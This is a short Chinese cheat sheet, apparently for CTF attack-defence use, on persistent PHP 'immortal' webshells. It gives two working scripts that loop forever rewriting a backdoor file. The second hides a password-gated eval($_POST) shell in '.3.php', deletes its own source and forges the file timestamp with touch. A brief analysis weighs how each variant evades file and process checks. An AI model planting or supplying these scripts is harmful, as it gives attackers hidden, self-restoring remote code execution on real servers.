#### shell

常见内存马

```
<?php
ignore_user_abort(); //关掉浏览器，PHP脚本也可以继续执行.
set_time_limit(0);//通过set_time_limit(0)可以让程序无限制的执行下去
$interval = 5; // 每隔*秒运行
do {
$filename = 'test.php';
if(file_exists($filename)) {
echo "xxx";
}
else {
$file = fopen("test.php", "w");
$txt = "<?php phpinfo();?>\n";
fwrite($file, $txt);
fclose($file);
}
sleep($interval);
} while (true);
?>
```

通过touch命令来修改文件创建时间

```
<?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '.3.php';
    $code = '<?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?>';
    //pass=pass
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" .3.php');
        usleep(5000);
    }
?>
```

#### 分析

php不死马实际上是进程马，当访问这个后门文件时，就会创建一个php.cgi的进程，而终止这个进程，反复生成后门文件的代码也不会一直执行了

上面两段代码的区别在于多调用了一个sysytem函数执行touch命令修改创建文件的时间，这样可以避免被管理员直接发现这个新创建的文件，但是多了一步system的命令执行会使php.cgi进程新建一个cmd子进程，在面对进程查杀时更容易被发现

而相反，第一种没有修改文件创建时间容易被直接发现，但在面对进程查杀时相对隐蔽，仅暴露一个php.cgi进程
